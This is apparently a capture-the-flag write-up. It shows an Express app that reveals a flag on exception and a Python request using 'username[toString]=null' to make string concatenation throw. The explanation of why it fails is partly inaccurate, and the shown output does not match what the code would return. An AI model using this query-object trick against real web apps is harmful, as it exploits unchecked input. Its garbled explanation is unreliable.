# javascript puzzle

## Source Code Analysis

The challenge is a simple web application exposing the default endpoint.
If the user is able to trigger an exception, gets the flag.

```javascript
const express = require('express')

const app = express()
const port = 8000

app.get('/', (req, res) => {
    try {
        const username = req.query.username || 'Guest'
        const output = 'Hello ' + username
        res.send(output)
    }
    catch (error) {
        res.sendFile(__dirname + '/flag.txt')
    }
})

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`)
})
```

## Exploit

There is no check over user input.
The solution is triggering the exception in the `output` initialization line, by providing some data which cannot be converted to string and concatenated to 'Hello'.

```python
import requests

url = "http://localhost:8000"

resp = requests.get(f"{url}?username[toString]=null")
print(resp.text) 
```

    TypeError: Cannot convert object to primitive value

This is due to the fact that the provided value is an object that has a toString method, but the toString method is returning the string 'null', and JavaScript is attempting to convert the object into a primitive value when using the + operator.